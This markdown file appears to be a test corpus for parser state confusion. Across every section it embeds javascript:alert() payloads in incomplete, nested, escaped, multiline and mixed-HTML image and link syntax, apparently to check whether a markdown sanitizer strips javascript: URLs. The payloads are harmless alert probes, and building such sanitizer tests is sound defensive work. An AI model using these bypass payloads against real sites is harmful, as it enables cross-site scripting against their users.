# Markdown Parser State Confusion

## Incomplete link syntax causing state confusion
![incomplete
javascript:alert('incomplete1')

[incomplete-ref
javascript:alert('incomplete2')

![](incomplete-url
javascript:alert('incomplete3')

## Nested incomplete syntax
![nested ![inner](javascript:alert('nested-incomplete'))
more text javascript:alert('after-incomplete')

## Reference definitions that break parsing
[attack1]: javascript:alert('ref1')
![](ref1)

[attack2]: 
javascript:alert('multiline-ref')
![](attack2)

## Mixed inline and reference styles
![ref-mixed](javascript:alert('inline')) and ![ref-mixed] also [ref-mixed]: javascript:alert('ref')

## Malformed escape sequences
![](java\script:alert('backslash-escape'))
![](java\\script:alert('double-backslash'))
![](java\]script:alert('bracket-escape'))
![](java\)script:alert('paren-escape'))

## Parser lookahead/lookbehind confusion
![before](javascript:alert('before'))![after](javascript:alert('after'))
![](javascript:alert('first'))[](javascript:alert('second'))

## Deeply nested structures
![outer ![middle ![inner](javascript:alert('deep'))](javascript:alert('mid'))](javascript:alert('outer'))

## State reset attempts
![](javascript:alert('reset1'))

<!-- comment that might reset state -->

![](javascript:alert('reset2'))

## Mixed markdown and HTML that could confuse parser state
<img src="safe.jpg" alt="text">![](javascript:alert('mixed'))

## Line break edge cases
![](javascript:
alert('break1'))

![](javascript:\
alert('break2'))

![](javascript: \
alert('break3'))